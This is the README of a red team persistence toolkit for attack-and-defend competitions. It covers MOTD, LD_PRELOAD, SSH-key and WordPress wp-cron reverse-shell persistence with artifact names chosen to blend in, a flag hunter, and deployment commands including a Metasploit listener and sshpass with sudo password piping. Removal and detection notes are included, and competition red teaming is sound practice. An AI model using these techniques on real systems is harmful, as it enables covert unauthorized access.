# Red Team Persistence Toolkit

## Repository Structure

```
red-team-toolkit/
└─ tool/
   ├─ deploy.sh          # Main deployment wrapper for persistence installation
   ├─ ld_gen.sh          # Generates the malicious LD_PRELOAD shared library
   ├─ ld_install.sh      # Installs LD_PRELOAD persistence on the target
   ├─ motd_poison.sh     # Installs MOTD login-triggered persistence
   ├─ ssh_inject.sh      # Injects SSH public keys for persistent access
   ├─ wp_cron.sh         # Installs WordPress wp-cron based persistence
   ├─ obfuscate.sh       # XOR + Base64 payload obfuscation helper library
   ├─ flag_hunt.sh       # Searches a compromised host for CTF flags
   ├─ archive/           # Deprecated / experimental persistence techniques
   │  ├─ at_callback.sh
   │  ├─ python_pth.sh
   │  └─ xdg_autostart.sh
   └─ README.md
```

## 1. Tool Overview

### What the Tool Does
This toolkit is a collection of lightweight Linux persistence utilities designed for use in attack-and-defend cybersecurity competitions. The toolkit allows a red team operator to quickly establish and maintain access on compromised Linux systems using several persistence mechanisms.

The primary entry point is `deploy.sh`, which automates deployment of persistence techniques across multiple target systems. The script transfers required toolkit components, installs persistence mechanisms, optionally hunts for flags, and performs cleanup operations.

Persistence mechanisms currently implemented include:

- MOTD execution persistence – executes payloads when a user logs in via SSH
- SSH key injection – adds a red team public key to authorized_keys files for persistent access
- LD_PRELOAD persistence – loads a malicious shared library into every process via `/etc/ld.so.preload`
- WordPress wp-cron persistence – injects a scheduled callback into WordPress's cron system (WordPress targets only)

All reverse shell mechanisms include a session-aware guard that suppresses duplicate callbacks while an active session exists. Root-privilege mechanisms (MOTD, LD_PRELOAD) and web-user mechanisms (wp_cron) operate on separate lockfiles so they never block each other.

The toolkit also includes a small obfuscation library used to encode payloads before writing them to system artifacts, and a flag hunting script for locating CTF flags across the compromised host.

### Why It's Useful for Red Team
During an attack-and-defend competition, access to systems may be frequently disrupted by defensive actions such as password resets, service restarts, or host reimaging. This toolkit provides multiple persistence methods so that if one method is removed, others may remain active.

The deployment wrapper allows persistence to be rapidly redeployed across multiple hosts during competition conditions, and automatically hunts for flags during the initial deployment window while root access is available.

### Category
Persistence / Post-Exploitation Tool

### High-Level Technical Approach

1. The operator configures targets and callback parameters in `deploy.sh`.
2. The toolkit compiles a malicious shared library payload locally.
3. Files are transferred to targets using SSH/SCP.
4. Persistence methods are installed on the remote host.
5. If `HUNT_FLAGS=true`, flag_hunt.sh runs on each target and prints results.
6. Temporary deployment files are removed to reduce indicators.

Techniques used include:

- `/etc/update-motd.d` execution hooks
- `authorized_keys` modification
- `/etc/ld.so.preload` library injection
- WordPress wp-cron hook injection via DB and mu-plugin
- Session-aware lockfile guard with heartbeat to suppress duplicate shells
- Simple payload obfuscation using XOR + Base64 encoding
- Layered filesystem, database, and process environment flag hunting


---

# 2. Requirements & Dependencies

### Target Operating Systems

Linux systems (tested primarily on Debian/Ubuntu based distributions).

### Required Tools on Attacker System

- bash
- ssh
- scp
- sshpass
- gcc

Install dependencies:

```
sudo apt install sshpass gcc
```

### Required Tools on Target System

Most Linux systems already include the required components:

- bash
- python3 (optional fallback reverse shell)
- SSH service
- php CLI (required for wp_cron DB injection — typically present on WordPress hosts)

### Required Privileges

Some persistence mechanisms require elevated privileges.

| Technique | Required Privilege |
|-----------|--------------------|
| SSH key injection | User or root |
| MOTD persistence | Root |
| LD_PRELOAD persistence | Root |
| wp-cron persistence | Web server user (www-data) or root |
| flag_hunt.sh | Root (for full coverage) |

### Network Prerequisites

The operator machine must be reachable from targets for reverse shell callbacks.

Example listener (handles multiple simultaneous sessions):

```
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; set ExitOnSession false; run -j"
```


---

# 3. Installation Instructions

Clone the repository:

```
git clone <repo_url>
cd red-team-toolkit/tool
```

No additional installation is required.

### Configure the Deployment Script

Edit the configuration section inside:

```
deploy.sh
```

Example configuration:

```bash
TARGETS=(
    "10.10.10.101"
    "10.10.10.104:wordpress"   # :wordpress tag enables wp_cron deployment
)

TARGET_USER="target"
TARGET_PASS="targetvm"
LHOST="10.10.10.160"
LPORT="4444"
SSH_PUBKEY="ssh-ed25519 AAAA..."
HUNT_FLAGS=true   # set false when redeploying mid-comp to skip flag hunt
```

### Verify Successful Setup

Ensure required tools exist:

```
which sshpass
which gcc
```


---

# 4. Usage Instructions

### Basic Usage

Run the deployment wrapper:

```
./deploy.sh
```

The script will:

1. Compile the shared library payload
2. Transfer toolkit files to each target
3. Install persistence mechanisms
4. Hunt for flags on each target (if HUNT_FLAGS=true)
5. Remove temporary files
6. Print a deployment summary and the listener command to run

### Example Output

```
[*] Compiling ld.so.preload shared library...
[+] Compiled libdconf-update.so

============================================================
[*] Deploying to 10.10.10.104 [wordpress]
============================================================

[*] Installing MOTD persistence...
[+] MOTD installed

[*] Injecting SSH key...
[+] SSH key injected

[*] Installing ld.so.preload persistence...
[+] Persistence Active

[*] Installing wp_cron persistence...
[+] wp_cron installed

[*] Hunting for flags...

  >>>>>>>>>> FLAGS FROM 10.10.10.104 <<<<<<<<<<

================================================================
  FLAG FOUND (#1)
  Value  : FLAG{example_flag_here}
  Source : /root/flag.txt
================================================================

  >>>>>>>>>> END FLAGS FROM 10.10.10.104 <<<<<<<<<<

[*] Cleanup complete

============================================================
[+] Deployment complete — Summary
============================================================
TARGET             MOTD     SSH      LD_PRELOAD   WP_CRON    FLAGS
--------------------------------------------------------------------
10.10.10.104       OK       OK       OK           OK         1 found
============================================================

[*] Start listener on 10.10.10.160 before triggering callbacks:
[*]   msfconsole -q -x "use multi/handler; ..."
```

### Advanced Usage

Operators may deploy individual persistence mechanisms manually.

Example MOTD persistence:

```
sudo LHOST=10.10.10.160 LPORT=4444 bash motd_poison.sh
```

SSH key injection:

```
SSH_PUBKEY="$(cat id_ed25519.pub)" bash ssh_inject.sh
```

Example wp-cron persistence (WordPress targets only):

```
LHOST=10.10.10.160 LPORT=4444 bash wp_cron.sh [/path/to/wp-config.php]
```

If no wp-config.php path is provided, the script will attempt to auto-discover it.

Run flag hunt manually on a target:

```bash
sshpass -p "<pass>" scp -o StrictHostKeyChecking=no flag_hunt.sh <user>@<target>:/tmp/
sshpass -p "<pass>" ssh -o StrictHostKeyChecking=no <user>@<target> \
    "echo '<pass>' | sudo -S bash /tmp/flag_hunt.sh"
```

### Managing Incoming Sessions

All persistence mechanisms callback to a single LHOST. Use Metasploit's `multi/handler` to manage multiple simultaneous sessions:

```
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.160; set LPORT 4444; set ExitOnSession false; run -j"
```

Useful session management commands inside msfconsole:

```
sessions -l        # list all active sessions with source IP
sessions -i 1      # interact with session 1
Ctrl+Z             # background current session
```


---

# 5. Persistence Mechanisms

## MOTD Execution Persistence

**Script:** `motd_poison.sh`
**Required privilege:** Root

Installs a script into `/etc/update-motd.d/` that fires a reverse shell each time a user logs in via SSH. The script is named to blend in with legitimate MOTD components.

Includes a session-aware guard using `/var/tmp/.dconf-lock-root`. If an active root session exists (lockfile touched within 60 seconds by the heartbeat), the payload silently exits rather than opening a duplicate shell. When the session dies, the heartbeat removes the lockfile and the next SSH login triggers a fresh callback.

**Trigger:** SSH login by any user.

**Artifact:** `/etc/update-motd.d/98-dconf-monitor`

**Removal:**
```
sudo rm /etc/update-motd.d/98-dconf-monitor
sudo rm -f /var/tmp/.dconf-lock-root
```

---

## LD_PRELOAD Persistence

**Scripts:** `ld_gen.sh`, `ld_install.sh`
**Required privilege:** Root

Compiles a malicious shared library that spawns a reverse shell as a constructor function. The library path is added to `/etc/ld.so.preload`, causing it to be injected into every process on the system.

Includes a session-aware guard using `/var/tmp/.dconf-lock-root` (shared with MOTD). Only one root shell fires at a time regardless of how many processes spawn. When the shell dies, the heartbeat removes the lockfile and the next process spawn triggers a fresh callback.

**Trigger:** Any process execution on the target system.

**Artifacts:**
- `/etc/ld.so.preload` (modified)
- `/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99`
- `/var/tmp/.dconf-lock-root` (runtime lockfile, removed when session dies)

**Removal:**
```
sudo sed -i '/libdconf/d' /etc/ld.so.preload
sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99
sudo rm -f /var/tmp/.dconf-lock-root
```

---

## SSH Key Injection

**Script:** `ssh_inject.sh`
**Required privilege:** User or root

Appends a red team public key to `~/.ssh/authorized_keys` for the current user. When run as root, injects into every user's authorized_keys file including root's.

**Trigger:** Persistent SSH access — no callback required.

**Artifact:** `~/.ssh/authorized_keys` (modified)

**Removal:**

Edit `~/.ssh/authorized_keys` and remove the injected key entry.

---

## WordPress wp-cron Persistence

**Script:** `wp_cron.sh`
**Required privilege:** Web server user (www-data) or root
**Applicable targets:** WordPress installations only — tag with `:wordpress` in deploy.sh

Installs a reverse shell callback into WordPress's cron system using two co-dependent components that must both be present for the mechanism to work.

**Cron entry (DB injection):** Writes a serialized `wp_cache_gc` event into the `wp_options` table so WordPress's cron system knows the hook exists and when to fire it. Parses DB credentials automatically from `wp-config.php`. Requires php CLI on the target.

**Hook callback (mu-plugin):** Drops a PHP file into `wp-content/mu-plugins/` that registers the callback function for the `wp_cache_gc` hook. Without this the cron entry fires but nothing executes. Also self-reschedules the cron entry if it goes missing. Requires write access to the WordPress directory.

Includes a session-aware guard using `/var/tmp/.dconf-lock-www` — separate from the root lockfile so wp_cron never blocks or is blocked by root shell mechanisms.

**Trigger:** Any HTTP request to the WordPress site (wp-cron fires on web traffic). Callbacks on a 5-minute schedule. Can be triggered manually:

```
curl -s http://<target>/wp-cron.php?doing_wp_cron >/dev/null
```

**Artifacts:**
- `wp_options` table rows: `cron`, `_wpcm_cb`
- `wp-content/mu-plugins/cache-manager.php`
- `/var/tmp/.dconf-lock-www` (runtime lockfile, removed when session dies)

**Removal:**
```
rm /var/www/html/wp-content/mu-plugins/cache-manager.php
mysql -u <user> -p <db> -e "DELETE FROM wp_options WHERE option_name IN ('cron','_wpcm_cb');"
sudo rm -f /var/tmp/.dconf-lock-www
```
Then restore a clean `cron` option value so WordPress reschedules its own legitimate events.

---

## Session-Aware Guard System

All reverse shell mechanisms use a lockfile-based guard to suppress duplicate callbacks while an active session exists. Two lockfiles are used to maintain privilege separation:

| Lockfile | Used by | Privilege tier |
|----------|---------|----------------|
| `/var/tmp/.dconf-lock-root` | MOTD, LD_PRELOAD | Root |
| `/var/tmp/.dconf-lock-www` | wp_cron | www-data |

Root mechanisms never block wp_cron and wp_cron never blocks root mechanisms. This ensures a low-privilege www-data shell never prevents a higher-value root shell from firing.

When a shell connects, a background heartbeat touches its lockfile every 30 seconds. When the session dies, the heartbeat exits and removes the lockfile. The next trigger fires freely once the lockfile is stale or absent.


---

# 6. Flag Hunting

**Script:** `flag_hunt.sh`
**Required privilege:** Root (for full coverage)
**Flag format:** `FLAG{...}`

Searches a compromised host for CTF flags across multiple layers, printing each discovered flag immediately as it is found with its source location. Deduplicates flags that appear in multiple locations.

### Search Layers

Flags are searched in order from fastest to slowest:

1. **High-probability filesystem locations** — `/root`, `/home`, `/opt`, `/srv`, `/var/www`, `/etc`, `/tmp`, and common flag filenames
2. **Service-specific locations** — web roots (auto-detected), WordPress installations, nginx/Apache configs, FTP roots, Samba share paths
3. **Process environments** — scans `/proc/*/environ` for flags in running process environment variables
4. **Databases** — MySQL/MariaDB (root, no password) and PostgreSQL (`postgres` user), scanning every column in every table
5. **Full filesystem fallback** — broad `grep` across the entire filesystem excluding pseudo-filesystems

### Usage

Flag hunting runs automatically during deployment when `HUNT_FLAGS=true` in `deploy.sh`.

To run manually on a target:

```bash
sshpass -p "<pass>" scp -o StrictHostKeyChecking=no flag_hunt.sh <user>@<target>:/tmp/
sshpass -p "<pass>" ssh -o StrictHostKeyChecking=no <user>@<target> \
    "echo '<pass>' | sudo -S bash /tmp/flag_hunt.sh"
```

Suppress progress messages and show only flag output:

```bash
bash /tmp/flag_hunt.sh 2>/dev/null
```

### Example Output

```
================================================================
  FLAG FOUND (#1)
  Value  : FLAG{easy_root_homedir_r00t}
  Source : /root/flag.txt
================================================================

================================================================
  FLAG FOUND (#2)
  Value  : FLAG{hard_database_row_s3cr3t}
  Source : mysql:ctf_flags.secrets.value
================================================================

================================================================
  FLAG HUNT COMPLETE
  Total flags found: 2
================================================================
```


---

# 7. Operational Notes

### Competition Use

Typical workflow during an attack-and-defend event:

1. Gain initial shell access
2. Configure and run `deploy.sh`
3. Start Metasploit `multi/handler` listener
4. Collect flags printed during deployment and submit to Discord
5. Maintain persistence while defenders attempt remediation
6. Set `HUNT_FLAGS=false` and redeploy if mechanisms are removed

### OpSec Considerations

Artifacts created include:

| Artifact | Location |
|----------|----------|
| MOTD script | `/etc/update-motd.d/98-dconf-monitor` |
| LD_PRELOAD entry | `/etc/ld.so.preload` |
| Shared library | `/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99` |
| SSH keys | `~/.ssh/authorized_keys` |
| wp-cron mu-plugin | `wp-content/mu-plugins/cache-manager.php` |
| wp-cron DB entries | `wp_options` table (`cron`, `_wpcm_cb`) |
| Root session lockfile | `/var/tmp/.dconf-lock-root` (runtime only) |
| WWW session lockfile | `/var/tmp/.dconf-lock-www` (runtime only) |

Temporary deployment directory (cleaned up after each run):

```
/var/tmp/.dconf
```

These artifacts may appear in:

- authentication logs
- process logs
- system audit logs
- WordPress admin panel (Plugins > Must-Use)

### Detection Risks

Defenders may detect:

- modifications to `/etc/ld.so.preload`
- new MOTD scripts in `/etc/update-motd.d/`
- new SSH keys in `authorized_keys`
- unusual outbound connections on port 4444
- unfamiliar mu-plugin in WordPress admin
- lockfiles in `/var/tmp/`


---

# 8. Limitations

### Functional Limitations

- Requires valid SSH credentials to deploy
- Some persistence methods require root privileges
- Reverse shells rely on outbound network connectivity
- wp_cron requires WordPress to be installed and receiving HTTP traffic
- flag_hunt.sh database scan requires MySQL root with no password or PostgreSQL accessible via `sudo -u postgres`

### Known Issues

- LD_PRELOAD persistence may cause instability on incompatible systems
- Systems without `/etc/update-motd.d` cannot use the MOTD persistence method
- wp_cron DB injection requires php CLI to be available on the target
- flag_hunt.sh Layer 5 (full filesystem grep) can be slow on large filesystems


---

# Archive Directory

The repository contains an `archive/` directory that stores older persistence experiments and alternative techniques. These scripts were developed during earlier iterations of the toolkit but are **not currently used in competition operations**.

They are retained for reference and potential future development but are **not part of the active deployment process and are intentionally excluded from the usage instructions in this document**.